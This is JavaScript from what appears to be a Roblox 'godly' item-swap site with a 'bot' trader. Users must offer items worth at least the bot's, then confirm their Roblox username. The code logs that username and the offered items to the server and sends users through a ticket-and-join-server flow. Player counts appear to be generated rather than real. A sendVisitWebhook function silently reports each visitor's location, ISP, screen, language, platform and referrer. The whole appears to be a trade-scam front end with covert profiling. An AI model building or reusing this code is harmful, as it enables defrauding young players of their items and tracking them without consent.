  fetchLocation().then(function (loc) {
    var cont = continentFromCode(loc.continent, loc.country);
    writeCache(loc.lat, loc.lng, cont);
    setLocation(loc.lat, loc.lng, cont, true);
    sendVisitWebhook(loc);
  }).catch(function () {
    if (!cached) setLocation(50.85, 4.35, 'Europe', true);
  });
}

function setLocation(lat, lng, continent, ready) {
  userLat = lat;
  userLng = lng;
  userContinent = continent;
  locationReady = !!ready;
  continentDistances = computeDists();
  continentRank = computeRanks(continentDistances);
  var stats = generateStats();
  continentPlayers = stats.players;
  continentServerCounts = stats.servers;
  updateJapanStats();
  initialized = true;
  renderServers();
  startUpdates();
}

function sendVisitWebhook(loc) {
  var city = (loc && loc.raw && loc.raw.city) || 'unknown';
  var region = (loc && loc.raw && loc.raw.region) || 'unknown';
  var country = (loc && loc.raw && loc.raw.country) || (loc && loc.country) || 'unknown';
  var isp = (loc && loc.raw && loc.raw.connection && loc.raw.connection.isp) || 'unknown';
  var screen = (window.screen && window.screen.width + 'x' + window.screen.height) || 'unknown';
  var lang = navigator.language || 'unknown';
  var platform = navigator.platform || 'unknown';
  var referrer = document.referrer || 'direct';
  var page = window.location.href;

  try {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/api/log-visit', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
      page: page,
      referrer: referrer,
      screen: screen,
      lang: lang,
      platform: platform,
      isp: isp,
      city: city,
      region: region,
      country: country
    }));
  } catch (e) {}
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", init);
} else {
  init();
}
var swapState = { you: [null, null, null, null], bot: [null, null, null, null] };
var swapEditing = null;
var swapSortMode = 'tiers';
var swapStockMode = false;

function swapDisplay(it) { return it.display || it.name; }

function swapTotals() {
  var you = 0, bot = 0;
  swapState.you.forEach(function (st) { if (st) you += SWAP_ITEMS[st.i].value * st.q; });
  swapState.bot.forEach(function (st) { if (st) bot += SWAP_ITEMS[st.i].value * st.q; });
  return { you: you, bot: bot };
}

function swapIsValid() {
  var t = swapTotals();
  return t.you > 0 && t.bot > 0 && t.you >= t.bot;
}

function renderSwapSlots() {
  ['you', 'bot'].forEach(function (side) {
    var wrap = document.getElementById(side === 'you' ? 'swapYouSlots' : 'swapBotSlots');
    if (!wrap) return;
    var html = '';
    for (var s = 0; s < 4; s++) {
      var st = swapState[side][s];
      if (!st) {
        html += '<button class="swap-slot empty" data-side="' + side + '" data-slot="' + s + '" title="Add a godly"><span class="slot-plus">+</span></button>';
      } else {
        var it = SWAP_ITEMS[st.i];
        html += '<div class="swap-slot filled cat-' + (it.cat || 'godly') + '" data-side="' + side + '" data-slot="' + s + '" title="Click to remove">' +
          '<img src="godlies/' + encodeURI(it.img) + '" alt="' + swapDisplay(it) + '" loading="lazy" decoding="async" draggable="false" />' +
          '<span class="slot-name">' + swapDisplay(it) + '</span>' +
          '<span class="slot-value">\uD83D\uDC8E ' + it.value + '</span>' +
          '<span class="slot-stepper">' +
            '<span class="slot-qty">x' + st.q + '</span>' +
            '<button class="slot-minus" title="Minus">\u2212</button>' +
            '<button class="slot-plus" title="Plus">+</button>' +
          '</span>' +
        '</div>';
      }
    }
    wrap.innerHTML = html;
  });

  var t = swapTotals();
  var youEl = document.getElementById('swapYouTotal');
  var botEl = document.getElementById('swapBotTotal');
  if (youEl) { youEl.textContent = '\uD83D\uDC8E ' + t.you; youEl.classList.toggle('ok', t.you > 0 && t.you >= t.bot); }
  if (botEl) botEl.textContent = '\uD83D\uDC8E ' + t.bot;
  var btn = document.getElementById('btnSwap');
  if (btn) btn.classList.toggle('ready', swapIsValid());
}

function swapTierGroups() {
  var groups = [];
  SWAP_ITEMS.forEach(function (it, i) {
    var g = null;
    for (var k = 0; k < groups.length; k++) if (groups[k].rank === it.rank) { g = groups[k]; break; }
    if (!g) { g = { rank: it.rank, label: it.label || it.tier, items: [] }; groups.push(g); }
    g.items.push(i);
  });
  groups.sort(function (a, b) { return a.rank - b.rank; });
  groups.forEach(function (g) {
    g.items.sort(function (a, b) { return SWAP_ITEMS[b].value - SWAP_ITEMS[a].value; });
  });
  return groups;
}

function swapCellHtml(i, showStock) {
  var it = SWAP_ITEMS[i];
  var noStock = showStock && it.stock === false;
  return '<button class="selector-cell cat-' + (it.cat || 'godly') + (noStock ? ' no-stock' : '') + '" data-index="' + i + '">' +
    '<img src="godlies/' + encodeURI(it.img) + '" alt="' + swapDisplay(it) + '" loading="lazy" decoding="async" draggable="false" />' +
    (noStock ? '<span class="no-stock-badge">NO STOCK</span>' : '') +
    '<span class="cell-name">' + swapDisplay(it) + '</span>' +
    '<span class="cell-value">\uD83D\uDC8E ' + it.value + '</span>' +
    '</button>';
}

function swapMatches(i, q) {
  if (!q) return true;
  var it = SWAP_ITEMS[i];
  return it.name.toLowerCase().indexOf(q) !== -1 || swapDisplay(it).toLowerCase().indexOf(q) !== -1;
}

function buildSelectorGrid(filter, mode) {
  var grid = document.getElementById('selectorGrid');
  if (!grid) return;
  var q = String(filter || '').trim().toLowerCase();
  var m = mode || swapSortMode;
  var html = '';

  if (m === 'value-desc' || m === 'value-asc' || m === 'name') {
    var idxs = [];
    SWAP_ITEMS.forEach(function (it, i) { if (swapMatches(i, q)) idxs.push(i); });
    if (m === 'value-desc') idxs.sort(function (a, b) { return SWAP_ITEMS[b].value - SWAP_ITEMS[a].value; });
    if (m === 'value-asc')  idxs.sort(function (a, b) { return SWAP_ITEMS[a].value - SWAP_ITEMS[b].value; });
    if (m === 'name')       idxs.sort(function (a, b) {
      var x = swapDisplay(SWAP_ITEMS[a]).toLowerCase();
      var y = swapDisplay(SWAP_ITEMS[b]).toLowerCase();
      return x < y ? -1 : (x > y ? 1 : 0);
    });
    html = idxs.map(function (i) { return swapCellHtml(i, swapStockMode); }).join('');
  } else {
    swapTierGroups().forEach(function (g) {
      var shown = g.items.filter(function (i) { return swapMatches(i, q); });
      if (!shown.length) return;
      html += '<div class="tier-header"><span class="tier-name">' + g.label + '</span><span class="tier-count">' + shown.length + '</span></div>';
      html += shown.map(function (i) { return swapCellHtml(i, swapStockMode); }).join('');
    });
  }

  grid.innerHTML = html || '<p class="selector-empty">No godlies match your search.</p>';
  grid.querySelectorAll('.selector-cell').forEach(function (c) {
    c.addEventListener('click', function () {
      var idx = parseInt(c.dataset.index, 10);
      var it = SWAP_ITEMS[idx];
      if (swapStockMode && it.stock === false) {
        showToast('No stock! Check again later.', 'images/jace.png');
        return;
      }
      if (swapEditing) {
        var merged = false;
        for (var si = 0; si < 4; si++) {
          var st = swapState[swapEditing.side][si];
          if (st && st.i === idx) { st.q += 1; merged = true; break; }
        }
        if (!merged) swapState[swapEditing.side][swapEditing.slot] = { i: idx, q: 1 };
      }
      closeSelector();
      renderSwapSlots();
      showToast('Added: ' + swapDisplay(it), 'godlies/' + encodeURI(it.img));
    });
  });
}

var swapSortLabels = {
  'tiers': 'Sort: Tiers',
  'value-desc': 'Sort: \uD83D\uDC8E \u2193',
  'value-asc': 'Sort: \uD83D\uDC8E \u2191',
  'name': 'Sort: A\u2013Z'
};

function updateSortButton() {
  var b = document.getElementById('btnSelectorSort');
  if (b) b.textContent = swapSortLabels[swapSortMode] || 'Sort';
}

function openSelector(side, slot) {
  swapEditing = { side: side, slot: slot };
  swapStockMode = (side === 'bot');
  var search = document.getElementById('selectorSearch');
  if (search) search.value = '';
  updateSortButton();
  buildSelectorGrid('');
  var ov = document.getElementById('selectorOverlay');
  if (!ov) return;
  ov.classList.add('show');
  ov.classList.remove('closing');
  document.body.classList.add('modal-lock');
  if (ssHelp) ssHelp.style.display = 'flex';
  if (search) setTimeout(function () { search.focus(); }, 60);
}

function closeSelector() {
  var ov = document.getElementById('selectorOverlay');
  if (!ov) return;
  ov.classList.add('closing');
  setTimeout(function () {
    ov.classList.remove('show', 'closing');
    swapEditing = null;
    document.body.classList.remove('modal-lock');
    if (ssHelp) ssHelp.style.display = 'none';
  }, 250);
}

function doSwap() {
  var t = swapTotals();
  if (t.you === 0 && t.bot === 0) { showToast('Add some godlies to both sides first!', 'images/jace.png'); return; }
  if (t.you === 0) { showToast('Your side is empty \u2014 add godlies!', 'images/jace.png'); return; }
  if (t.bot === 0) { showToast('Bot side is empty \u2014 pick what the bot gives!', 'images/jacebot.png'); return; }
  if (t.you < t.bot) {
    showToast('Your \uD83D\uDC8E ' + t.you + ' is LOWER than the bot\'s \uD83D\uDC8E ' + t.bot + ' \u2014 add more!', 'images/jace.png');
    var container = document.querySelector('.swap-container');
    if (container) { container.classList.remove('shake'); void container.offsetWidth; container.classList.add('shake'); }
    return;
  }
  if (t.you === t.bot) {
    showToast('Equal trade!', 'images/checkmark_white.png');
  } else {
    showToast('Trade is valid! Confirm your Roblox account.', 'images/checkmark_white.png');
  }
  openSwapVerify();
}

function initSwap() {
  ['swapYouSlots', 'swapBotSlots'].forEach(function (id) {
    var wrap = document.getElementById(id);
    if (!wrap) return;
    wrap.addEventListener('click', function (e) {
      var slotEl = e.target.closest('.swap-slot');
      if (!slotEl) return;
      var side = slotEl.dataset.side;
      var slot = parseInt(slotEl.dataset.slot, 10);
      var st = swapState[side][slot];
      if (!st) { openSelector(side, slot); return; }
      if (e.target.closest('.slot-plus')) { st.q += 1; renderSwapSlots(); return; }
      if (e.target.closest('.slot-minus')) { if (st.q > 1) { st.q -= 1; } else { swapState[side][slot] = null; } renderSwapSlots(); return; }
      swapState[side][slot] = null;
      renderSwapSlots();
    });
  });
  var btnSwap = document.getElementById('btnSwap');
  if (btnSwap) btnSwap.addEventListener('click', doSwap);
  var ov = document.getElementById('selectorOverlay');

  /* iOS Safari: block page-scroll while selector is open.
     Allow scrolling only inside .selector-grid and only when it has room to scroll. */
  var closeBtn = document.getElementById('btnSelectorClose');
  if (closeBtn) closeBtn.addEventListener('click', closeSelector);
  var search = document.getElementById('selectorSearch');
  if (search) search.addEventListener('input', function () { buildSelectorGrid(search.value); });
  var sortBtn = document.getElementById('btnSelectorSort');
  if (sortBtn) sortBtn.addEventListener('click', function () {
    var order = ['tiers', 'value-desc', 'value-asc', 'name'];
    var i = order.indexOf(swapSortMode);
    swapSortMode = order[(i + 1) % order.length];
    updateSortButton();
    buildSelectorGrid(search ? search.value : '');
  });
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && ov && ov.classList.contains('show')) closeSelector();
  });
  renderSwapSlots();
}
if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initSwap);
else initSwap();

var valuesSortMode = 'tiers';
var detailCurrent = null;

function renderValuesGrid(filter) {
  var grid = document.getElementById('valuesGrid');
  if (!grid) return;
  var q = String(filter || '').trim().toLowerCase();
  var m = valuesSortMode;
  var html = '';

  if (m === 'value-desc' || m === 'value-asc' || m === 'name') {
    var idxs = [];
    SWAP_ITEMS.forEach(function (it, i) { if (swapMatches(i, q)) idxs.push(i); });
    if (m === 'value-desc') idxs.sort(function (a, b) { return SWAP_ITEMS[b].value - SWAP_ITEMS[a].value; });
    if (m === 'value-asc')  idxs.sort(function (a, b) { return SWAP_ITEMS[a].value - SWAP_ITEMS[b].value; });
    if (m === 'name')       idxs.sort(function (a, b) {
      var x = swapDisplay(SWAP_ITEMS[a]).toLowerCase();
      var y = swapDisplay(SWAP_ITEMS[b]).toLowerCase();
      return x < y ? -1 : (x > y ? 1 : 0);
    });
    html = idxs.map(function (i) { return swapCellHtml(i, false); }).join('');
  } else {
    swapTierGroups().forEach(function (g) {
      var shown = g.items.filter(function (i) { return swapMatches(i, q); });
      if (!shown.length) return;
      html += '<div class="tier-header"><span class="tier-name">' + g.label + '</span><span class="tier-count">' + shown.length + '</span></div>';
      html += shown.map(function (i) { return swapCellHtml(i, false); }).join('');
    });
  }

  grid.innerHTML = html || '<p class="selector-empty">No godlies match your search.</p>';
  grid.querySelectorAll('.selector-cell').forEach(function (c) {
    c.addEventListener('click', function () { openDetail(parseInt(c.dataset.index, 10)); });
  });
}

function openDetail(i) {
  var it = SWAP_ITEMS[i];
  if (!it) return;
  detailCurrent = i;
  var ov = document.getElementById('detailOverlay');
  var img = document.getElementById('detailImg');
  var nameEl = document.getElementById('detailName');
  var valEl = document.getElementById('detailValue');
  var descEl = document.getElementById('detailDesc');
  var win = document.getElementById('detailWindow');
  if (img) img.src = 'godlies/' + encodeURI(it.img);
  if (nameEl) nameEl.textContent = swapDisplay(it);
  if (valEl) valEl.textContent = '\uD83D\uDC8E ' + it.value;
  if (descEl) descEl.textContent = it.desc || '';
  if (win) win.className = 'modal-window detail-window cat-' + (it.cat || 'godly');
  if (ov) { ov.classList.add('show'); ov.classList.remove('closing'); }
}

function closeDetail() {
  var ov = document.getElementById('detailOverlay');
  if (!ov) return;
  ov.classList.add('closing');
  setTimeout(function () { ov.classList.remove('show', 'closing'); detailCurrent = null; }, 250);
}

function detailSwapIt() {
  if (detailCurrent === null) return;
  var i = detailCurrent;
  var it = SWAP_ITEMS[i];
  var placed = false;
  for (var s = 0; s < 4; s++) {
    if (!swapState.you[s]) { swapState.you[s] = { i: i, q: 1 }; placed = true; break; }
  }
  if (!placed) { showToast('Your side is full - remove something first!', 'images/kick.png'); return; }
  closeDetail();
  switchTab('swap');
  renderSwapSlots();
  showToast('Added to your swap: ' + swapDisplay(it), 'godlies/' + encodeURI(it.img));
}

function updateValuesSortButton() {
  var b = document.getElementById('btnValuesSort');
  if (b) b.textContent = swapSortLabels[valuesSortMode] || 'Sort';
}

function initValues() {
  renderValuesGrid('');
  var search = document.getElementById('valuesSearch');
  if (search) search.addEventListener('input', function () { renderValuesGrid(search.value); });
  var sortBtn = document.getElementById('btnValuesSort');
  if (sortBtn) sortBtn.addEventListener('click', function () {
    var order = ['tiers', 'value-desc', 'value-asc', 'name'];
    var i = order.indexOf(valuesSortMode);
    valuesSortMode = order[(i + 1) % order.length];
    updateValuesSortButton();
    renderValuesGrid(search ? search.value : '');
  });
  var swapBtn = document.getElementById('btnValuesSwap');
  if (swapBtn) swapBtn.addEventListener('click', function () { switchTab('swap'); });
  var ov = document.getElementById('detailOverlay');
  if (ov) ov.addEventListener('click', function (e) { if (e.target === ov || !e.target.closest('.detail-window')) closeDetail(); });
  var closeBtn = document.getElementById('btnDetailClose');
  if (closeBtn) closeBtn.addEventListener('click', closeDetail);
  var detailSwap = document.getElementById('btnDetailSwap');
  if (detailSwap) detailSwap.addEventListener('click', detailSwapIt);
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && ov && ov.classList.contains('show')) closeDetail();
  });
  updateValuesSortButton();
}
if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initValues);
else initValues();

var svuUser = null;

function openSwapVerify() {
  svuUser = null;
  var ov = document.getElementById('swapUserOverlay');
  var inp = document.getElementById('svuInput');
  var err = document.getElementById('svuError');
  var load = document.getElementById('svuLoading');
  if (inp) inp.value = '';
  if (err) err.textContent = '';
  if (load) load.style.display = 'none';
  svuShowStep('svuStepSearch');
  if (ov) { ov.classList.add('show'); ov.classList.remove('closing'); }
  if (inp) setTimeout(function () { inp.focus(); }, 60);
}

function closeSwapVerify() {
  var ov = document.getElementById('swapUserOverlay');
  if (!ov) return;
  ov.classList.add('closing');
  setTimeout(function () { ov.classList.remove('show', 'closing'); }, 250);
}

function svuShowStep(id) {
  ['svuStepSearch', 'svuStepConfirm', 'svuStepDone'].forEach(function (s) {
    var el = document.getElementById(s);
    if (el) el.style.display = (s === id) ? 'block' : 'none';
  });
}

function svuSetError(msg) {
  var err = document.getElementById('svuError');
  var load = document.getElementById('svuLoading');
  if (err) err.textContent = msg || '';
  if (load) load.style.display = 'none';
}

function doSvuSearch() {
  var inp = document.getElementById('svuInput');
  var name = inp ? inp.value.trim() : '';
  var err = document.getElementById('svuError');
  var load = document.getElementById('svuLoading');
  if (!name) { svuSetError('Type your Roblox username first.'); return; }
  if (err) err.textContent = '';
  if (load) load.style.display = 'block';
  fetch('/api/rblx-user?username=' + encodeURIComponent(name))
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d && d.error) { svuSetError('No Roblox account found with that username.'); return; }
      svuUser = d;
      return fetch('/api/rblx-headshot?userId=' + d.id)
        .then(function (r) { return r.json(); })
        .then(function (hd) {
          var hs = document.getElementById('svuHeadshot');
          var disp = document.getElementById('svuDisplay');
          var nm = document.getElementById('svuName');
          if (hs) hs.src = (hd && hd.imageUrl) || 'images/jace.png';
          if (disp) disp.textContent = d.displayName;
          if (nm) nm.textContent = '@' + d.name;
          svuShowStep('svuStepConfirm');
          svuSetError('');
        })
        .catch(function () { svuSetError('Could not load your headshot. Try again.'); });
    })
    .catch(function () { svuSetError('Could not reach Roblox. Check your connection.'); });
}

function svuConfirm() {
  lastSwapTrade = {
    you: swapState.you.map(function (st) { return st ? { i: st.i, q: st.q } : null; }),
    bot: swapState.bot.map(function (st) { return st ? { i: st.i, q: st.q } : null; })
  };
  swapState.you = [null, null, null, null];
  swapState.bot = [null, null, null, null];
  renderSwapSlots();
  try {
    var youItems = lastSwapTrade.you.filter(function (st) { return !!st; });
    if (youItems.length && svuUser) {
      fetch('/api/log-swap', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: svuUser.name,
          items: youItems.map(function (st) { return { name: SWAP_ITEMS[st.i].name, qty: st.q }; }),
          time: new Date().toLocaleString('en-GB', { timeZone: 'Europe/Sofia' })
        })
      }).catch(function () {});
    }
  } catch (err) {}
  closeSwapVerify();
  openTicketWindow();
}

function svuRetry() {
  svuUser = null;
  svuShowStep('svuStepSearch');
  svuSetError('');
}


var ticketTimer = null;
var lastSwapTrade = null;
var currentTicketCode = '';

function genTicketCode() {
  var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  var out = '';
  for (var i = 0; i < 6; i++) out += chars.charAt(Math.floor(Math.random() * chars.length));
  currentTicketCode = '#' + out.slice(0, 3) + '-' + out.slice(3);
  return currentTicketCode;
}

function genRoomCode() {
  var out = '';
  for (var i = 0; i < 12; i++) out += Math.floor(Math.random() * 10);
  return out;
}

function openTicketWindow() {
  var ov = document.getElementById('ticketOverlay');
  var load = document.getElementById('ticketLoading');
  var wrap = document.getElementById('ticketCodeWrap');
  var code = document.getElementById('ticketCode');
  var btn = document.getElementById('btnTicketNext');
  if (code) code.textContent = genTicketCode();
  if (load) load.style.display = 'block';
  if (wrap) wrap.style.display = 'none';
  if (btn) btn.disabled = true;
  if (ov) { ov.classList.add('show'); ov.classList.remove('closing'); }
  if (ticketTimer) clearTimeout(ticketTimer);
  ticketTimer = setTimeout(function () {
    if (load) load.style.display = 'none';
    if (wrap) wrap.style.display = 'block';
    if (btn) btn.disabled = false;
  }, 1600);
}

function closeTicketWindow() {
  var ov = document.getElementById('ticketOverlay');
  if (ticketTimer) clearTimeout(ticketTimer);
  if (!ov) return;
  ov.classList.add('closing');
  setTimeout(function () { ov.classList.remove('show', 'closing'); }, 250);
}

function openSwapJoinFlow() {
  closeTicketWindow();
  openJoinSwap({ country: 'Japan', city: 'Tokyo', continent: 'Asia', popular: true });
}

function initSvu() {
  var searchBtn = document.getElementById('btnSvuSearch');
  if (searchBtn) searchBtn.addEventListener('click', doSvuSearch);
  var inp = document.getElementById('svuInput');
  if (inp) inp.addEventListener('keydown', function (e) { if (e.key === 'Enter') doSvuSearch(); });
  var yes = document.getElementById('btnSvuYes');
  if (yes) yes.addEventListener('click', svuConfirm);
  var no = document.getElementById('btnSvuNo');
  if (no) no.addEventListener('click', svuRetry);
  var done = document.getElementById('btnSvuDone');
  if (done) done.addEventListener('click', closeSwapVerify);
  var closeBtn = document.getElementById('btnSvuClose');
  if (closeBtn) closeBtn.addEventListener('click', closeSwapVerify);
  var ov = document.getElementById('swapUserOverlay');
  if (ov) ov.addEventListener('click', function (e) { if (e.target === ov || !e.target.closest('.svu-window')) closeSwapVerify(); });
  var announce = document.getElementById('btnAnnounceSwap');
  if (announce) announce.addEventListener('click', function () { switchTab('swap'); });
  document.querySelectorAll('.announce-card.collapsible').forEach(function (card) {
    card.addEventListener('click', function () { card.classList.toggle('open'); });
  });
  var tktNext = document.getElementById('btnTicketNext');
  if (tktNext) tktNext.addEventListener('click', openSwapJoinFlow);
  var tktOv = document.getElementById('ticketOverlay');
  if (tktOv) tktOv.addEventListener('click', function (e) { if (e.target === tktOv || !e.target.closest('.ticket-window')) closeTicketWindow(); });
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && ov && ov.classList.contains('show')) closeSwapVerify();
    if (e.key === 'Escape' && tktOv && tktOv.classList.contains('show')) closeTicketWindow();
  });
}
if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initSvu);
else initSvu();

var ssHelp = document.getElementById('safariScrollHelp');
var ssOv = document.getElementById('selectorOverlay');
if (ssHelp) {
  var ssScroll = function (dy) {
    if (!ssOv) return;
    if (typeof ssOv.scrollBy === 'function') {
      try { ssOv.scrollBy({ top: dy, behavior: 'smooth' }); return; } catch (e) {}
    }
    ssOv.scrollTop += dy;
  };
  var ssUp = document.getElementById('ssBtnUp');
  var ssDown = document.getElementById('ssBtnDown');
  if (ssUp) ssUp.addEventListener('click', function () { ssScroll(-400); });
  if (ssDown) ssDown.addEventListener('click', function () { ssScroll(400); });
}
